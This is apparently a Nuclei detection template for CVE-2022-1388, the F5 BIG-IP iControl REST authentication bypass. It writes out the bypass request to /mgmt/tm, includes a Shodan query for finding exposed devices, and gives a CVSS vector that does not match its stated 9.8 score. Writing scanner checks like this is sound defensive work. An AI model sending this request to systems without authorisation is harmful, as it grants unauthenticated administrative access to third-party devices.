id: CVE-2022-1388

info:
  name: "F5 BIG-IP iControl REST Remote Code Execution"
  author: topscoder
  severity: Critical
  description: "This vulnerability may allow an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands, create or delete files, or disable services."
  reference:
    - https://github.com/Al1ex/CVE-2022-1388
    - https://github.com/ZephrFish/F5-CVE-2022-1388-Exploit
    
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 9.8
    cve-id: CVE-2022-1388
  metadata:
    fofa-query:
    google-query: 
    shodan-query: 'vuln:CVE-2022-1388'
  tags: cve

requests:
  - method: GET
    headers:
      Authorization: Basic YWRtaW46
      X-F5-Auth-Token: 1
      Connection: X-Forwarded-Host, X-F5-Auth-Token
      Content-Length: 0
    path:
      - "{{BaseURL}}/mgmt/tm"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "items"
        part: body